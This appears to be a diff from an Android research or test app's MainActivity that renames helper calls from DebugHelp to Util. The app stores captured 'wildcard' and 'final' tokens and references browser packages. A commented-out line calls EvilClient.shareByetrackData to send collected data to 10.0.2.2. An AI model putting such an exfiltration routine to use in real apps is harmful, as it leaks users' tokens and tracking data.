@@ -63,8 +63,8 @@ public class MainActivity extends AppCompatActivity {
         String CAPSTORAGE_FINAL = "final_token";
         finalPrefs = this.getSharedPreferences(CAPSTORAGE_FINAL, Context.MODE_PRIVATE);
 
-        wildcard_sharedPrefsListener = (sharedPrefs, key) -> wildcardTokensStored.setText(DebugHelp.displayWildcardTokens(this));
-        final_sharedPrefsListener = (sharedPrefs, key) -> finalTokensStored.setText(DebugHelp.displayFinalTokens(this));
+        wildcard_sharedPrefsListener = (sharedPrefs, key) -> wildcardTokensStored.setText(Util.displayWildcardTokens(this));
+        final_sharedPrefsListener = (sharedPrefs, key) -> finalTokensStored.setText(Util.displayFinalTokens(this));
 
         // Browser Packages
         String FIREFOX_FENIX = "org.mozilla.fenix.debug";
@@ -145,7 +145,7 @@ public class MainActivity extends AppCompatActivity {
         });
 
         storeButton.setOnClickListener(v -> {
-            DebugHelp.clearTokenStorage(finalPrefs);
+            Util.clearTokenStorage(finalPrefs);
             //DebugHelp.clearTokenStorage(wildcardPrefs);
             //EvilClient.shareByetrackData(mContext, "10.0.2.2");
         });
@@ -230,8 +230,8 @@ public class MainActivity extends AppCompatActivity {
         super.onStart();
         wildcardPrefs.registerOnSharedPreferenceChangeListener(wildcard_sharedPrefsListener);
         finalPrefs.registerOnSharedPreferenceChangeListener(final_sharedPrefsListener);
-        wildcardTokensStored.setText(DebugHelp.displayWildcardTokens(this));
-        finalTokensStored.setText(DebugHelp.displayFinalTokens(this));
+        wildcardTokensStored.setText(Util.displayWildcardTokens(this));
+        finalTokensStored.setText(Util.displayFinalTokens(this));
     }
 
     @Override
